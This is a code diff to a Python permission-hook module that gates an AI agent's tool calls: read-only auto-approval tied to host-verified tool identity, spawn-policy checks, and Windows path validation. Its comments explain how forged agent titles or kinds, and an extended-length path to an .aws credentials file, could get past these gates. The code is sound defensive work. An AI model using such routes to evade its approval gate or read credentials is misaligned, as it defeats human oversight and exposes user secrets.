+        if not classifier_only:
+            _identity_ref = (
+                mcp_identity_ref(mcp_server_name, mcp_tool_name)
+                if mcp_server_name and mcp_tool_name and mcp_identity_trusted
+                else ""
+            )
+            grant_targets: tuple[str, ...]
+            if _identity_ref:
+                grant_targets = (f"Running: {_identity_ref}", _identity_ref)
+                identity_grant = True
+            else:
+                grant_targets = (tool_name, normalized)
+                identity_grant = False
+            for pattern in self._config.auto_approve_tools:
+                if any(_tool_matches(pattern, target) for target in grant_targets):
+                    return ToolHookResult.auto_approve(identity_grant=identity_grant)
+            if _identity_ref:
+                # Runtime breadcrumb for the deliberate title-match exclusion: a
+                # pattern that matches the agent-authored title does not grant an
+                # identity-verified MCP call. On an unattended surface the only
+                # other symptom is a card nobody answers, so say once per
+                # (pattern, identity) which rewrite restores the grant.
+                for pattern in self._config.auto_approve_tools:
+                    if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
+                        _note_title_only_grant_pattern(pattern, _identity_ref)
 
         # KiroCrew-side read-only auto-approve — the LAST branch before allow(),
         # AFTER every early-return deny (deny-by-default shell, sensitive-path,
@@ -1043,28 +1501,60 @@ class HookManager:
         # and governance). Its position guarantees a read-only classification can
         # never re-admit anything the gates above blocked. This re-homes the
         # "reads don't nag" UX now that kiro-cli's autoAllowReadonly is retired.
-        # Imports are function-local: slack.gateway imports hooks at module top,
-        # so a top-level import here would create a boot import cycle.
+        # The slack.gateway import below is function-local: slack.gateway imports
+        # hooks at module top, so a top-level import here would create a boot
+        # import cycle. The bash classifier lives on the security surface, which
+        # this module already imports at top, so it needs no such dodge.
+        # Every auto-approve below carries ``read_only=True``: a verdict about the
+        # call's EFFECT, and the only auto-approve READ_ONLY honours. The grant
+        # tiers above stay untagged.
         if is_shell:
             # A shell read-only classification uses the deny-by-default bash
             # classifier (rejects redirects/substitution/backgrounding). When the
             # command could not be recovered we already denied above; a present
             # command that is not read-only falls through to interactive approval.
-            from kiro_crew.dashboard.state import is_read_only_bash
-
             if command and is_read_only_bash(command):
-                return ToolHookResult.auto_approve()
+                return ToolHookResult.auto_approve(read_only=True)
         else:
             from kiro_crew.slack.gateway import _is_read_only_tool
 
             kind = (tool_kind or "").strip().lower()
+            if classifier_only:
+                # READ_ONLY has no approver behind it, so a read-only verdict
+                # here EXECUTES the call unattended. Under this flag the proof
+                # must come from HOST-TRUSTED facts alone. The shell branch
+                # above already judges the recovered command; this branch
+                # accepts only a built-in the host knows to be read-only,
+                # identified by the non-model-authored ``_meta.kiro.toolName``
+                # (``mcp_tool_name``) with no MCP server behind it, and ONLY
+                # when ``mcp_identity_trusted`` says that pair came from the
+                # provenance-verified caches rather than an inline payload or
+                # a hand-built event — the absence of a server name proves
+                # nothing until the pair itself is proven host-stamped. The two
+                # agent-influenced inputs that reach this point prove nothing:
+                # ``kind`` is the ACP ``kind`` field passed through verbatim
+                # (the interactive path below keeps its existing kind
+                # allow-list, unchanged), and the title is model-authored
+                # prose. Both may NARROW — a non-read kind refuses even a
+                # host-known read tool, so the two must agree — never widen.
+                # An MCP-served tool carries no host-trusted read-only marker
+                # on the permission event (``readOnlyHint`` is a manifest claim
+                # nothing forwards to the gate), so it is not provable here and
+                # falls to the caller's path, which under READ_ONLY refuses.
+                if kind and kind not in _READ_ONLY_TOOL_KINDS:
+                    return ToolHookResult.allow()
+                if _is_host_read_only_builtin(
+                    mcp_tool_name, mcp_server_name, mcp_identity_trusted=mcp_identity_trusted
+                ):
+                    return ToolHookResult.auto_approve(read_only=True)
+                return ToolHookResult.allow()
             # Trust the SEMANTIC kind, as an ALLOW-list. `tool_kind` is passed
             # through verbatim from the ACP `kind` field (``acp/_dispatch.py``), so it
             # is an arbitrary agent-influenced string and a DENYLIST of mutating kinds
             # can never be complete — `kind="other"` is a real ACP value. Only these
             # two spellings mean "this cannot change anything".
             if kind in _READ_ONLY_TOOL_KINDS:
-                return ToolHookResult.auto_approve()
+                return ToolHookResult.auto_approve(read_only=True)
             # Computer-use observation tools ("reads don't nag" for this feature too),
             # and they require an EXPLICIT read-only kind — reached only under the
             # branch above. Two agent-controlled inputs meet here and neither may
@@ -1089,7 +1579,7 @@ class HookManager:
             # still wins. There is deliberately no approval-floor clamp to mention: the
             # `computer_use.approval` ordinal was removed with the rest of that model.
             if kind in _READ_ONLY_TOOL_KINDS and _cu_read_only_auto_approve(tool_name):
-                return ToolHookResult.auto_approve()
+                return ToolHookResult.auto_approve(read_only=True)
             # Any other non-empty kind falls through to interactive approval, whatever
             # the call titles itself. Over-blocking costs one prompt; under-blocking
             # costs the prompt.
@@ -1101,7 +1591,7 @@ class HookManager:
             # (verified) — so a forged computer-use title cannot reach an auto-approve
             # through this path either.
             if _is_read_only_tool(tool_name):
-                return ToolHookResult.auto_approve()
+                return ToolHookResult.auto_approve(read_only=True)
 
         return ToolHookResult.allow()
 
@@ -1148,10 +1638,64 @@ class HookManager:
 # "move"; add conservatively (auto-approving trusts an agent-supplied field).
 _READ_ONLY_TOOL_KINDS: frozenset[str] = frozenset({"read", "fetch"})
 
-# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate no longer
-# branches on this set, and must not start again: `tool_kind` arrives verbatim from
-# the ACP `kind` field, so any denylist of mutating kinds is incomplete by
-# construction (`kind="other"` is a real value that a denylist auto-approved). The
+# Built-in tools the HOST knows to be read-only, keyed by the non-model-authored
+# ``_meta.kiro.toolName`` identity kiro-cli stamps on every tool call it serves.
+# This is the ONLY non-shell read-only proof ``on_tool_call`` accepts under
+# ``classifier_only`` (``ToolApprovalPolicy.READ_ONLY``, the side chat): the ACP
+# ``kind`` and the title are agent-influenced and may narrow but never prove.
+# Every name here maps to a read scope in ``governance.BUILTIN_TOOL_SCOPES``
+# (``filesystem.read`` / ``network.egress``) and never to ``filesystem.write``
+# or ``commands`` — ``test_host_read_only_builtins_map_only_to_read_scopes``
+# (``test/test_hooks.py``) pins that, so a write-capable built-in (``code``,
+# ``fs_write``) cannot join by mistake. Add conservatively: an entry here runs
+# unattended on a surface with no approver.
+_HOST_READ_ONLY_BUILTIN_TOOLS: frozenset[str] = frozenset(
+    {"fs_read", "glob", "grep", "web_fetch", "web_search"}
+)
+
+
+def _is_host_read_only_builtin(
+    mcp_tool_name: str, mcp_server_name: str, *, mcp_identity_trusted: bool
+) -> bool:
+    """True when the host-trusted identity names a known read-only BUILT-IN.
+
+    Three facts must hold, and the first is a POSITIVE provenance signal rather
+    than an absence:
+
+    * ``mcp_identity_trusted`` — the identity pair was populated from a
+      provenance-verified source (``AcpEvent.mcp_identity_trusted``: the
+      ``_meta.kiro`` parse this client made of the tool_call frame, carried to
+      the permission event through the origin-scoped caches). A pair that
+      arrived any other way — an inline payload, an event a caller built by
+      hand, a cache miss — says nothing about WHO named the tool, so a
+      ``fs_read`` there is prose, not identity. This is the same flag
+      ``event_is_spawn_run`` demands before it trusts a tool identity.
+    * ``mcp_tool_name`` non-empty — ``_meta.kiro.toolName``, which kiro-cli
+      sets for built-ins too. Empty (a backend that omits ``_meta.kiro``, an
+      uncached permission event) identifies nothing and matches nothing.
+    * ``mcp_server_name`` empty — kiro-cli stamps ``mcpServerName`` on every
+      MCP-served call, so an MCP server exposing a tool that happens to be
+      called ``fs_read`` carries a server name and fails closed here. Only a
+      built-in has no server behind it.
+
+    What this cannot see: a backend that stamps ``toolName`` but never
+    ``mcpServerName`` for MCP-served calls. The provenance flag proves the pair
+    came from the frame this client parsed, not that the backend honoured the
+    stamping contract; that contract belongs to kiro-cli
+    (``kiro_tool_identity_meta`` in the engine) and is the one every
+    ``mcp_server_name`` consumer in this module already rests on.
+    """
+    if not mcp_identity_trusted:
+        return False
+    if mcp_server_name or not mcp_tool_name:
+        return False
+    return mcp_tool_name in _HOST_READ_ONLY_BUILTIN_TOOLS
+
+
+# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate does not
+# branch on this set, and must not start: `tool_kind` arrives verbatim from the ACP
+# `kind` field, so any denylist of mutating kinds is incomplete by construction
+# (`kind="other"` is a real value that a denylist auto-approves). The
 # auto-approve decision is an ALLOW-list on `_READ_ONLY_TOOL_KINDS` instead, and
 # every other non-empty kind falls through to interactive approval.
 #
@@ -1221,6 +1765,29 @@ def hooks_config_from_config_dict(hooks_section: dict) -> HooksConfig:
     merged = dict(hooks_section) if isinstance(hooks_section, dict) else {}
     merged["denied_commands"] = load_denied_commands_state()
     return HooksConfig.from_dict(merged)
+
+
+def splice_denied_commands(base: HooksConfig, denied_state: dict | None = None) -> HooksConfig:
+    """Return *base* with only its denied-command opt-out fields taken from the keystone.
+
+    The deny ceiling and the flat hook keys come from different files -- the
+    agent-unwritable ``denied_commands.json`` and operator-editable
+    ``config.json`` -- so whichever one changed, the other's contribution must
+    survive. Both live-reload paths route through here: a Settings>Security write
+    splices fresh keystone state onto the running config, and a ``config.json``
+    hooks reload splices the CURRENT keystone state onto the freshly parsed flat
+    keys. Without it, one write silently reverts the other half.
+
+    *denied_state* defaults to reading the keystone.
+    """
+    state = load_denied_commands_state() if denied_state is None else denied_state
+    parsed = HooksConfig.from_dict({"denied_commands": state})
+    return dataclasses_replace(
+        base,
+        denied_commands_disabled_ids=parsed.denied_commands_disabled_ids,
+        denied_commands_disable_all=parsed.denied_commands_disable_all,
+        denied_commands_user_added=parsed.denied_commands_user_added,
+    )
 
 
 def resolve_effective_denied_regexes(
@@ -1308,16 +1875,31 @@ def _governance_denial(
     app: str,
     tool_kind: str = "",
     raw_params: dict | None = None,
+    diff_path: str = "",
     mcp_ref: str = "",
     extra_titles: tuple[str, ...] = (),
+    spawn_target: str = "",
 ) -> str | None:
     """Return a denial reason if governance forbids *tool_name*, else None.
+
+    *spawn_target* is the agent a backend-stated sub-agent spawn will start (set
+    only from KAS's own ``_meta.kiro.consent``; see ``AcpEvent.spawn_target``).
+    When set, ``capabilities.spawn`` is judged too -- the gate on, and the target
+    in its ``agents`` scope -- on the SAME ceiling and profile this call resolved,
+    so a spawn costs no second profile resolution and cannot be judged against a
+    different profile snapshot. A spawn policy is not a ``tools`` rule, so the
+    title question alone cannot answer it.
 
     *mcp_ref* is an already-canonical ``@server`` / ``@server/tool`` reference
     for the trusted MCP identity, evaluated in addition to (or instead of) the
     display title. It is passed as a reference rather than folded into
     *tool_name* because the title grammar cannot encode every identity; both are
     empty for a non-MCP call with no title, which governs nothing.
+
+    *diff_path* is the diff content block's path for an edit-kind call; it joins
+    the ``filesystem.write`` target set the gate classifies
+    (``classify_tool_args``), so a diff-only edit is judged against an
+    ALLOW-mode write confinement rather than reaching it pathless.
 
     Resolves the active profile (Level 2) for the calling surface and intersects
     it with the boot-frozen ceiling (Level 1).  Fast no-op when the host has
@@ -1347,6 +1929,7 @@ def _governance_denial(
             tool_name,
             tool_kind=tool_kind,
             raw_params=raw_params,
+            diff_path=diff_path,
             mcp_ref=mcp_ref,
             extra_titles=extra_titles,
         )
@@ -1357,6 +1940,8 @@ def _governance_denial(
             subject = getattr(decision, "item", "") or tool_name or mcp_ref
             _audit_governance(session_key, agent, subject, decision)
             return f"Blocked by governance policy: {decision.reason}"
+        if spawn_target:
+            return _spawn_policy_denial(ceiling, profile, spawn_target, session_key, agent)
         return None
     except PlatformCompositionError:
         raise
@@ -1372,6 +1957,37 @@ def _governance_denial(
         except Exception:
             logger.debug("governance degrade audit unavailable", exc_info=True)
         return None
+
+
+def _spawn_policy_denial(
+    ceiling: Any, profile: Any, target: str, session_key: str, agent: str
+) -> str | None:
+    """The ``capabilities.spawn`` verdict for a spawn of *target*, or None.
+
+    The two questions ``subagent._vet_spawn_governance`` asks -- is spawning on,
+    and is *target* in the ``agents`` scope -- put to a ceiling and profile the
+    caller already resolved. Fails CLOSED, unlike the ``tools`` question around
+    it: this is an authorization for a spawn, and an evaluation error that
+    permitted it would be the bypass the check exists to stop.
+    """
+    from kiro_crew.platform.context import PlatformCompositionError
+    from kiro_crew.platform.governance import resolve
+
+    try:
+        gate = resolve(ceiling, profile, "capabilities.spawn", "")
+        if not gate.permitted:
+            _audit_governance(session_key, agent, target, gate)
+            return f"Blocked by spawn policy: {gate.reason}"
+        scoped = resolve(ceiling, profile, "capabilities.spawn", f"agents:{target}")
+        if not scoped.permitted:
+            _audit_governance(session_key, agent, target, scoped)
+            return f"Blocked by spawn policy: agent {target!r} is not permitted"
+        return None
+    except PlatformCompositionError:
+        raise
+    except Exception:
+        logger.warning("spawn policy could not be evaluated; refusing the spawn", exc_info=True)
+        return "Blocked by spawn policy: it could not be evaluated"
 
 
 def _app_owns_mcp_server(mcp_server_name: str, app: str) -> bool:
@@ -1574,6 +2190,8 @@ def _cu_read_only_auto_approve(tool_name: str) -> bool:
 
 def _audit_governance(session_key: str, agent: str, tool_name: str, decision: object) -> None:
     """Best-effort SEL audit of a governance denial (records scope/rule/layer)."""
+    if _GATE_UNCOUNTED.get():
+        return
     try:
         from kiro_crew.sel import sel
 
@@ -1885,6 +2503,61 @@ def _search_deny_target(raw_params: dict | None) -> str:
     return " ".join(fields)
 
 
+#: (pattern, identity) pairs already reported by ``_note_title_only_grant_pattern``,
+#: bounded so a misconfigured pattern over a long session cannot grow it without limit.
+_TITLE_ONLY_GRANT_NOTED: set[tuple[str, str]] = set()
+_TITLE_ONLY_GRANT_NOTED_CAP = 512
+
+
+def _note_title_only_grant_pattern(pattern: str, identity_ref: str) -> None:
+    """Log once that an ``auto_approve_tools`` pattern matches only the title.
+
+    For an MCP call with a verified identity the grant is keyed on
+    ``@server/tool``, so a pattern written against the agent-authored title
+    (a ``description``, or a title that does not spell the identity) stops
+    granting. The visible symptom is an approval card, which on an unattended
+    surface nobody answers; this line is the breadcrumb that connects the card
+    to the pattern and names the rewrite.
+    """
+    key = (pattern, identity_ref)
+    if key in _TITLE_ONLY_GRANT_NOTED:
+        return
+    if len(_TITLE_ONLY_GRANT_NOTED) >= _TITLE_ONLY_GRANT_NOTED_CAP:
+        _TITLE_ONLY_GRANT_NOTED.clear()
+    _TITLE_ONLY_GRANT_NOTED.add(key)
+    logger.warning(
+        "auto_approve_tools pattern %r matches this call's title but not its verified MCP "
+        "identity %s; for an MCP call the grant is keyed on the identity, so the call falls "
+        "to interactive approval. Rewrite the pattern as %r (or 'Running: %s').",
+        pattern,
+        identity_ref,
+        identity_ref,
+        identity_ref,
+    )
+
+
+def identity_grant_covers_child(result: ToolHookResult, event: object) -> bool:
+    """True when a hook auto-approve may stand for a LOW-FIDELITY child request.
+
+    A backend-subagent permission event whose arguments are unverified is
+    normally downgraded past every hook auto-approve, because those grants read
+    the agent-authored title. The one exception is a grant the hook decided by
+    the call's VERIFIED MCP identity (``ToolHookResult.identity_grant``) for an
+    event whose own identity verified (``AcpEvent.child_mcp_identity_trusted``):
+    both sides of that match are the same ``_meta.kiro`` server/tool pair the
+    client cached from the tool_call frame, so nothing the agent authors
+    reaches the decision. It is also the user's NARROW grant — they allowed
+    this tool — where session trust-all or YOLO would allow every tool the
+    child calls. The dashboard runner and the subagent manager both consult
+    this so the two consumers cannot drift on the rule.
+    """
+    return bool(
+        result.action == TOOL_AUTO_APPROVE
+        and result.identity_grant
+        and getattr(event, "child_mcp_identity_trusted", False)
+    )
+
+
 def _normalize_tool_name(tool_name: str) -> str:
     """Strip display prefixes so hook patterns match the actual tool/command name."""
     for prefix in _TOOL_TITLE_PREFIXES:
@@ -1937,8 +2610,82 @@ def _tool_matches(pattern: str, tool_name: str) -> bool:
 
 
 def is_unc_shape(raw: str) -> bool:
-    """True for a UNC-shaped path: two leading separators, either style."""
+    """True for a UNC-shaped path: two leading separators, either style.
+
+    One exception, because Windows ``os.readlink`` returns an ordinary local target in
+    EXTENDED-LENGTH form -- ``\\\\?\\C:\\Users\\...`` -- which starts with two separators and
+    would otherwise be judged a network share, refusing every local symlink as if it reached a
+    host over SMB. A real UNC in that form is ``\\\\?\\UNC\\server\\share``; ``\\\\?\\C:`` is a
+    LOCAL drive path. So a ``\\\\?\\`` prefix whose remainder is drive-absolute (``C:\\...``) is
+    NOT a share. The distinction is exactly the one the readlink-chain walker already draws
+    (``\\\\?\\UNC\\`` -> share, ``\\\\?\\<drive>:`` -> local): ``\\\\?\\UNC\\...`` stays a share,
+    and other extended namespaces (``\\\\?\\GLOBALROOT\\...``, ``\\\\?\\Volume{guid}\\...``,
+    device paths) stay shaped-as-UNC so they are refused fail-closed rather than admitted as
+    local. The fold is case-insensitive because the OS honours the ``UNC`` component that way.
+    """
+    if len(raw) >= 4 and raw[:4] == "\\\\?\\":
+        # Extended-length prefix. A drive-absolute remainder is a plain local path, not a share;
+        # ``\\?\UNC\...`` and every other extended namespace remain UNC-shaped (refused).
+        return not _DRIVE_ABS_RE.match(raw[4:])
     return len(raw) >= 2 and raw[0] in "\\/" and raw[1] in "\\/"
+
+
+_unc_data_home_root_cache: tuple[tuple[object, ...], Path | None] | None = None
+
+
+def _unc_data_home_root() -> Path | None:
+    """The data home as a UNC-gate trusted root, memoized per configuration.
+
+    The twin of :func:`_unc_agents_root`, and it exists for the same reason.
+    ``data_home()`` is cheap only on its *default-home* branch: with
+    ``KIROCREW_HOME`` set it calls ``_valid_override_home()`` FIRST, on every
+    call, and that does ``Path(override).expanduser().resolve()`` --
+    filesystem I/O, and on a UNC-shaped override an SMB touch. ``config_dir()``
+    memoizes, but that memo sits BEHIND the predicate, so it never covers this.
+    Measured at this PR's head: three ``protected_ref_spans()`` calls produced
+    three resolves of the override.
+
+    That is the one configuration this gate has to be fast in. A roaming
+    profile is exactly when ``KIROCREW_HOME`` points at a share, so the
+    per-call resolve lands on the host whose latency the gate promises never to
+    depend on -- and :func:`unc_probe_allowed` is reached from
+    ``iter_local_refs``, which ``telegram.renderer._rotate_on_length`` runs
+    INLINE on the event loop against a documented 7-15 us/KB budget.
+
+    Resolves through :func:`peek_data_home`, NOT :func:`data_home`: this module
+    primes the memo at import time, and ``data_home()`` on a first resolution
+    delegates to ``config_dir()`` -- ``mkdir`` plus the recovery-breadcrumb
+    write. The gate only needs to know WHERE the root is (a path-prefix trust
+    check), so importing this module must not create directories or write
+    breadcrumbs -- that maintenance belongs to ``ensure_data_home()`` at process
+    start. ``peek_data_home()`` applies the SAME override predicate, so reader
+    and writer agree on the root, and reads nothing else.
+
+    Memoized on the RAW ``KIROCREW_HOME`` value plus the accessor identity and
+    the resolved-home cache the default branch reads -- so an env change, a
+    monkeypatched accessor or a reset of the resolution cache all invalidate
+    naturally.
+
+    A computation failure memoizes ``None`` (root absent, gate stays total),
+    for the reason :func:`_unc_agents_root` gives: the failure being avoided is
+    a per-call resolve that can block on an SMB timeout, and the degraded state
+    -- UNC attachment paths refused -- is the safe one.
+    """
+    global _unc_data_home_root_cache
+    key: tuple[object, ...] = (
+        os.environ.get("KIROCREW_HOME"),
+        _config_paths.peek_data_home,
+        getattr(_config_paths, "_resolved_home", None),
+    )
+    cached = _unc_data_home_root_cache
+    if cached is not None and cached[0] == key:
+        return cached[1]
+    try:
+        root: Path | None = _config_paths.peek_data_home()
+    except (ValueError, OSError, RuntimeError):
+        root = None
+    _unc_data_home_root_cache = (key, root)
+    return root
 
 
 _unc_agents_root_cache: tuple[tuple[object, ...], Path | None] | None = None
@@ -1951,8 +2698,8 @@ def _unc_agents_root() -> Path | None:
     filesystem I/O, and on a UNC-shaped override an SMB touch), so consulting
     it per gate check would put blocking I/O -- and exactly the network access
     this gate promises not to make -- on every validation, including async
-    callers (review finding on #6728). Memoized on the RAW ``KIRO_HOME`` env
-    value plus the accessor and override-hook identities, so the resolution
+    callers. Memoized on the RAW ``KIRO_HOME`` env value plus the accessor
+    and override-hook identities, so the resolution
     runs once per configuration and a monkeypatched or hot-swapped accessor
     invalidates naturally. Mirrors how ``data_home()`` keeps its own hot path
     cheap.
@@ -1960,8 +2707,8 @@ def _unc_agents_root() -> Path | None:
     A computation failure memoizes ``None`` (root absent, gate stays total):
     deterministic-per-configuration beats self-healing here, because the
     failure mode being avoided is a per-call resolve that can block on an SMB
-    timeout, and the degraded state -- UNC agent specs refused -- is exactly
-    the pre-#6721 status quo. Recovery is an env change or process restart.
+    timeout, and the degraded state -- UNC agent specs refused -- is the safe
+    one. Recovery is an env change or process restart.
     Benign write race under threads: last-writer-wins on an idempotent value.
     """
     global _unc_agents_root_cache
@@ -1988,18 +2735,24 @@ def _unc_agents_root() -> Path | None:
     return root
 
 
-# Prime the memo at import time (review finding, #6728 round 3): without this
-# the FIRST gate check after process start -- or after a ``KIRO_HOME`` change --
+# Prime the memo at import time: without this the FIRST gate check after
+# process start -- or after a ``KIRO_HOME`` change --
 # still pays the resolving accessor on whatever thread asked, which on an async
 # validation path is the event loop. Import of this module happens at process
 # start, off the loop, so the one resolution per configuration lands there.
 # Best-effort: a failure here memoizes root-absent exactly as a lazy miss would.
 _unc_agents_root()
-#: Upper bound on the Windows leaf link chain validate_file_path will walk
-#: hop-by-hop before refusing. Mirrors the kernels' own symlink-resolution
-#: ceilings (Linux SYMLOOP_MAX chains resolve to ELOOP at 40): a longer
-#: chain is refused rather than probed.
-_LEAF_LINK_CHAIN_MAX = 40
+# Same priming for the data home, for the same reason: the first gate check
+# after start (or after a ``KIROCREW_HOME`` change) would otherwise pay the
+# override resolve on whatever thread asked, which on the inline classifier
+# path is the event loop.
+_unc_data_home_root()
+#: Upper bound on the Windows link chain validate_file_path will walk
+#: hop-by-hop before refusing. Covers both linked ancestors and the leaf.
+#: Mirrors the kernels' own symlink-resolution ceilings (Linux SYMLOOP_MAX
+#: chains resolve to ELOOP at 40): a longer chain is refused rather than
+#: probed.
+_WINDOWS_LINK_CHAIN_MAX = 40
 
 #: Component-depth ceiling for the Windows link screens in
 #: validate_file_path. The ancestor walk costs one lstat per component, so an
@@ -2019,6 +2772,23 @@ _DRIVE_ABS_RE = re.compile(r"^[A-Za-z]:[\\/]")
 _DRIVE_PREFIX_RE = re.compile(r"^[A-Za-z]:")
 
 
+def _fold_extended_length_local(raw: str) -> str:
+    r"""Fold a ``\\?\<drive>:\...`` extended-length LOCAL path to plain ``<drive>:\...``.
+
+    Only a DRIVE-absolute remainder is folded. ``\\?\UNC\...`` and every other
+    extended namespace (``\\?\GLOBALROOT\...``, ``\\?\Volume{guid}\...``, device
+    paths) are returned unchanged, so ``is_unc_shape`` still reports them
+    UNC-shaped and the UNC trusted-root gate refuses them fail-closed --
+    stripping the prefix there would launder a share (or a kernel object) into a
+    local-looking string. The lexical twin of the readlink-target ``\\?\`` fold
+    in :func:`validate_file_path`; a cheap string test with no filesystem or
+    network I/O.
+    """
+    if len(raw) >= 4 and raw[:4] == "\\\\?\\" and _DRIVE_ABS_RE.match(raw[4:]):
+        return raw[4:]
+    return raw
+
+
 def unc_probe_allowed(raw: str) -> bool:
     """Whether a UNC-shaped path may touch the filesystem on Windows.
 
@@ -2033,19 +2803,26 @@ def unc_probe_allowed(raw: str) -> bool:
     (``apps.bridges._register_agents`` and ``agent.rebuild_agent_config``
     write the managed specs there -- see ``kiro_agents_dir()``'s docstring;
     on a roaming profile it sits on the same UNC share as the data home, and
-    without it every user-level agent spec read was silently refused, #6721).
-    The comparison is purely lexical (``normpath``/``normcase``) and the
-    agents root is memoized per configuration (see ``_unc_agents_root``), so
-    this check never touches the network itself.
+    without it every user-level agent spec read is silently refused).
+    The comparison is purely lexical (``normpath``/``normcase``) and BOTH
+    resolving roots are memoized per configuration (``_unc_data_home_root``,
+    ``_unc_agents_root``), so this check never touches the network itself.
+
+    The data home is memoized for the same reason as the agents dir, and the
+    omission was load-bearing rather than cosmetic: ``data_home()`` resolves
+    ``KIROCREW_HOME`` on every call when that override is set, which is
+    precisely the roaming-profile configuration in which the override names a
+    share. Calling it per gate check put an SMB round-trip inside a predicate
+    documented as lexical.
     """
     try:
         cand = os.path.normcase(os.path.normpath(raw))
     except (ValueError, OSError):
         return False
-    roots: tuple[Path, ...] = (_config_paths.data_home(), Path(tempfile.gettempdir()))
-    agents_root = _unc_agents_root()
-    if agents_root is not None:
-        roots += (agents_root,)
+    roots: tuple[Path, ...] = (Path(tempfile.gettempdir()),)
+    for extra in (_unc_data_home_root(), _unc_agents_root()):
+        if extra is not None:
+            roots += (extra,)
     for root in roots:
         rootn = os.path.normcase(os.path.normpath(str(root)))
         if not is_unc_shape(rootn):
@@ -2055,17 +2832,157 @@ def unc_probe_allowed(raw: str) -> bool:
     return False
 
 
+def _is_representable_path(raw: str) -> bool:
+    """Can the OS path layer represent this string at all?
+
+    ``realpath``/``lstat`` raise on a string the filesystem cannot carry:
+    ``ValueError`` for an embedded NUL, and ``UnicodeEncodeError`` (a
+    ``ValueError`` subclass) for a lone surrogate the platform's own error
+    handler cannot round-trip. Callers of :func:`validate_file_path` treat only
+    ``None`` as a refusal, so such a path resolved into the resolution below and
+    surfaced from the dashboard file handlers as an uncaught HTTP 500 rather than
+    the 400 it is.
+
+    Scoped to strings that are genuinely unrepresentable, and nothing else. This
+    is a SHARED chokepoint -- ``safe_read_file_bytes_nolink`` routes through it,
+    and its callers include diagnostics that deliberately enumerate a file whose
+    name holds a control character in order to report on it (an agent-writeable
+    directory can contain one, and the reporting layer escapes the name for
+    display). Refusing a broader class here would turn such a report into "could
+    not be compared" and so suppress the finding it exists to make. A path whose
+    control characters must be refused is refused by the boundary that receives
+    it, not here: see ``_validate_dashboard_path`` in the dashboard file
+    handlers. Only NUL is refused here, because no file can be named with one, so
+    no consumer loses a real name.
+
+    Nor is this "refuse anything a sanitizer would alter". A canonically
+    decomposed name is the form macOS stores and a name may legally end in a
+    space; both differ from their sanitized form and both resolve correctly.
+
+    The encoding attempt is the discriminator rather than a character list,
+    because it asks the question the syscall will ask: it accepts a surrogate the
+    platform's own error handler round-trips -- ``surrogateescape`` for a POSIX
+    name holding non-UTF-8 bytes, ``surrogatepass`` for an unpaired surrogate in
+    a legal NTFS name -- and rejects one it cannot. Both the encoding and the
+    error handler are read from ``sys``, which is what makes this the same
+    operation as ``os.fsencode`` on every platform rather than only on POSIX.
+    ``sys`` rather than ``os`` because this module's ``os`` is substituted
+    wholesale by tests exercising the Windows gates below, and a check a stub can
+    silently remove is not a check.
+    """
+    if "\x00" in raw:
+        return False
+    try:
+        raw.encode(sys.getfilesystemencoding(), sys.getfilesystemencodeerrors())
+    except (UnicodeError, ValueError):
+        return False
+    return True
+
+
+def _normalize_windows_link_target(link_path: str, raw_target: str) -> str | None:
+    r"""Normalize one Windows link target without traversing through the link.
+
+    The return value is safe to screen as a new path. Untrusted UNC targets,
+    ambiguous drive/root-relative targets, and extended device namespaces are
+    refused before any filesystem probe can follow them.
+    """
+    target = raw_target
+    if target[:8].upper() == "\\\\?\\UNC\\":
+        target = "\\\\" + target[8:]
+    elif target.startswith("\\\\?\\"):
+        if not _DRIVE_ABS_RE.match(target[4:]):
+            return None
+        target = target[4:]
+
+    if is_unc_shape(target):
+        if not unc_probe_allowed(target):
+            return None
+    elif _DRIVE_ABS_RE.match(target):
+        pass
+    elif target[:1] in "\\/" or _DRIVE_PREFIX_RE.match(target):
+        return None
+    else:
+        target = os.path.normpath(os.path.join(os.path.dirname(link_path), target))
+
+    if target.count("\\") + target.count("/") > _MAX_SCREENED_PATH_DEPTH:
+        return None
+    return target
+
+
+def _screen_windows_links(target: str) -> str | None:
+    """Replace Windows links with screened targets before ``realpath``.
+
+    ``first_linked_ancestor`` walks root-first without traversing a link.
+    Reading that link's own reparse metadata is safe. Replacing the linked
+    prefix with its vetted target preserves the remaining child path while
+    avoiding the blanket rejection of benign local junctions.
+    """
+    for _ in range(_WINDOWS_LINK_CHAIN_MAX):
+        if target.count("\\") + target.count("/") > _MAX_SCREENED_PATH_DEPTH:
+            return None
+
+        linked = platform_compat.first_linked_ancestor(target)
+        if linked is not None:
+            try:
+                raw_target = os.readlink(linked)  # lgtm[py/path-injection]
+                suffix = os.path.relpath(target, linked)
+            except (OSError, ValueError):
+                return None
+            if suffix == ".." or suffix.startswith(".." + os.sep):
+                return None
+            normalized = _normalize_windows_link_target(linked, raw_target)
+            if normalized is None:
+                return None
+            target = os.path.normpath(os.path.join(normalized, suffix))
+            continue
+
+        if not platform_compat.is_link_or_junction(target):
+            return target
+        try:
+            raw_target = os.readlink(target)  # lgtm[py/path-injection]
+        except OSError:
+            return None
+        normalized = _normalize_windows_link_target(target, raw_target)
+        if normalized is None:
+            return None
+        target = normalized
+
+    return None
+
+
 def validate_file_path(raw: str) -> str | None:
     """Validate and canonicalize a file path for dashboard file I/O.
 
-    Enforces: the Windows UNC trusted-root gate (BEFORE any resolution --
+    Enforces: representability in the OS path layer (BEFORE any syscall sees the
+    string), the Windows UNC trusted-root gate (BEFORE any resolution --
     ``realpath`` on a UNC path is itself the outbound SMB probe), the Windows
-    linked-ancestor gate (a linked ancestor launders the same probe past the
+    link-target screen (a link can launder the same probe past the
     lexical UNC check), is_sensitive_path(), realpath canonicalization.
     Returns the canonical path or None if rejected.
     """
     if not raw:
         return None
+    if not _is_representable_path(raw):
+        return None
+    if os.name == "nt":
+        # Fold a ``\\?\<drive>:\...`` extended-length LOCAL path down to its
+        # plain ``<drive>:\...`` spelling BEFORE any gate below.
+        # ``is_unc_shape`` correctly reports ``\\?\C:\...`` as non-UNC (it names
+        # a local drive, not a share), so the UNC gate lets it through -- but
+        # the sensitive-path fence at the tail compares the resolved path
+        # against ``$HOME``-anchored credential leaves, and the ``\\?\``-prefixed
+        # spelling matches none of them, so a dashboard read of
+        # ``\\?\C:\Users\<user>\.aws\credentials`` would slip the fence.
+        # Normalising here makes every downstream form the fence can see -- the
+        # raw string, its ``normpath``, and ``realpath`` -- the ordinary
+        # ``C:\Users\...`` path, so ``is_sensitive_path`` recognises the
+        # credential leaf regardless of whether ``realpath`` happens to strip
+        # the prefix (it does not for a non-existent target on every CPython).
